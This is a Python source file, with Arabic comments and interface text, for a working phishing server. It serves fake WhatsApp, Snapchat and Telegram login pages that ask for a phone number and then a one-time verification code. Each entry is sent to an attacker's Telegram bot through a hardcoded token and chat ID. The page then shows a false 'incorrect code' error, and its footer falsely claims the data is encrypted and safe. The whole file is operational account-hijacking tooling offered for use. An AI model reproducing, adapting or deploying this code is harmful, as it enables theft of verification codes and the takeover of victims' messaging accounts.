from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import urllib.parse
import requests

# ===== إعدادات البوت =====
BOT_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
CHAT_ID = "1170411845"

# ===== دالة الإرسال للبوت =====
def send_to_telegram(service, phone, code=""):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    if code:
        message = f"✅ [{service}]\n📱 الهاتف: {phone}\n🔑 الرمز: {code}"
    else:
        message = f"📌 [{service}]\n📱 الهاتف: {phone}\n⏳ في انتظار الرمز..."
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message}, timeout=10)
    except:
        pass

# ===== خادم الفيشينج =====
class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.end_headers()
            html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 35px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            width: 100%;
            max-width: 420px;
            border: 1px solid #333;
        }
        .logo { text-align: center; font-size: 48px; margin-bottom: 10px; }
        .title { color: #fff; text-align: center; font-size: 24px; font-weight: 600; }
        .subtitle { color: #aaa; text-align: center; font-size: 14px; margin-bottom: 28px; }
        .service-tabs {
            display: flex; gap: 10px; margin-bottom: 25px; justify-content: center;
        }
        .service-tab {
            background: #2a2a2a; color: #ccc; border: none; padding: 10px 18px;
            border-radius: 30px; font-size: 14px; font-weight: 600; cursor: pointer;
            transition: 0.3s;
        }
        .service-tab.active.wa { background: #25D366; color: #000; }
        .service-tab.active.sn { background: #FFFC00; color: #000; }
        .service-tab.active.tg { background: #0088cc; color: #fff; }
        .input-group { margin-bottom: 16px; }
        .input-group label { color: #ccc; font-size: 13px; font-weight: 500; display: block; margin-bottom: 5px; }
        .input-group input {
            width: 100%; padding: 14px 16px; background: #2a2a2a;
            border: 1px solid #3a3a3a; border-radius: 12px; color: #fff; font-size: 15px;
        }
        .input-group input:focus { outline: none; border-color: #25D366; background: #1f1f1f; }
        .btn-login {
            width: 100%; padding: 14px; background: #25D366; color: #000;
            border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: 0.3s; margin-top: 8px;
        }
        .btn-login:hover { transform: scale(1.02); filter: brightness(1.1); }
        .footer { text-align: center; color: #666; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">🔐</div>
    <div class="title">تسجيل الدخول</div>
    <div class="subtitle">اختر الخدمة وأدخل رقم هاتفك</div>
    <div class="service-tabs">
        <button class="service-tab wa active" onclick="setService('wa')">📱 واتساب</button>
        <button class="service-tab sn" onclick="setService('sn')">👻 سناب</button>
        <button class="service-tab tg" onclick="setService('tg')">✈️ تليجرام</button>
    </div>
    <form action="/send_phone" method="POST">
        <input type="hidden" name="service" id="serviceInput" value="wa">
        <div class="input-group">
            <label>رقم الهاتف</label>
            <input type="text" name="phone" placeholder="أدخل رقم هاتفك" required>
        </div>
        <button type="submit" class="btn-login">متابعة</button>
    </form>
    <div class="footer">🔒 جميع البيانات مشفرة وآمنة</div>
</div>
<script>
    function setService(id) {
        document.querySelectorAll('.service-tab').forEach(t => t.classList.remove('active'));
        document.querySelector(`.service-tab.${id}`).classList.add('active');
        document.getElementById('serviceInput').value = id;
    }
</script>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))

        elif self.path.startswith("/code"):
            self.send_response(200)
            self.end_headers()
            # استخراج المعاملات من الرابط
            query = urllib.parse.parse_qs(self.path.split("?")[1]) if "?" in self.path else {}
            service = query.get("service", ["wa"])[0]
            phone = query.get("phone", ["+"])[0]
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #0a0a0a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: #1a1a1a;
            padding: 40px 35px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            width: 100%;
            max-width: 420px;
            border: 1px solid #333;
            text-align: center;
        }}
        .icon {{ font-size: 48px; margin-bottom: 10px; }}
        .title {{ color: #fff; font-size: 22px; font-weight: 600; }}
        .subtitle {{ color: #aaa; font-size: 14px; margin-bottom: 20px; }}
        .input-group {{ margin-bottom: 16px; }}
        .input-group input {{
            width: 100%; padding: 14px 16px; background: #2a2a2a;
            border: 1px solid #3a3a3a; border-radius: 12px; color: #fff; font-size: 15px;
            text-align: center; letter-spacing: 4px;
        }}
        .btn-login {{
            width: 100%; padding: 14px; background: #25D366; color: #000;
            border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: 0.3s;
        }}
        .btn-login:hover {{ transform: scale(1.02); filter: brightness(1.1); }}
        .footer {{ color: #666; font-size: 12px; margin-top: 20px; }}
    </style>
</head>
<body>
<div class="container">
    <div class="icon">📨</div>
    <div class="title">تم إرسال الرمز</div>
    <div class="subtitle">أدخل رمز التحقق الذي تلقيته</div>
    <form action="/verify_code" method="POST">
        <input type="hidden" name="service" value="{service}">
        <input type="hidden" name="phone" value="{phone}">
        <div class="input-group">
            <input type="text" name="code" placeholder="رمز التحقق" required>
        </div>
        <button type="submit" class="btn-login">تحقق</button>
    </form>
    <div class="footer">🔒 جميع البيانات مشفرة وآمنة</div>
</div>
</body>
</html>"""
            self.wfile.write(html.encode("utf-8"))

        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/send_phone":
            length = int(self.headers["Content-Length"])
            raw = self.rfile.read(length).decode()
            data = urllib.parse.parse_qs(raw)
            service = data.get("service", ["wa"])[0]
            phone = data.get("phone", [""])[0]

            send_to_telegram(service, phone)

            self.send_response(302)
            self.send_header("Location", f"/code?service={service}&phone={phone}")
            self.end_headers()

        elif self.path == "/verify_code":
            length = int(self.headers["Content-Length"])
            raw = self.rfile.read(length).decode()
            data = urllib.parse.parse_qs(raw)
            service = data.get("service", ["wa"])[0]
            phone = data.get("phone", [""])[0]
            code = data.get("code", [""])[0]

            send_to_telegram(service, phone, code)

            self.send_response(200)
            self.end_headers()
            self.wfile.write("""
                <h3 style="color:#ff6b6b;text-align:center;margin-top:50px;font-family:sans-serif;">
                    ⚠️ رمز التحقق غير صحيح، حاول مجدداً
                </h3>
            """.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return

# ===== تشغيل الخادم =====
def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), PhishingHandler)
    print(f"[✓] خادم الفيشينج المتقدم يعمل على المنفذ {port}")
    server.serve_forever()

if __name__ == "__main__":
    run_server()
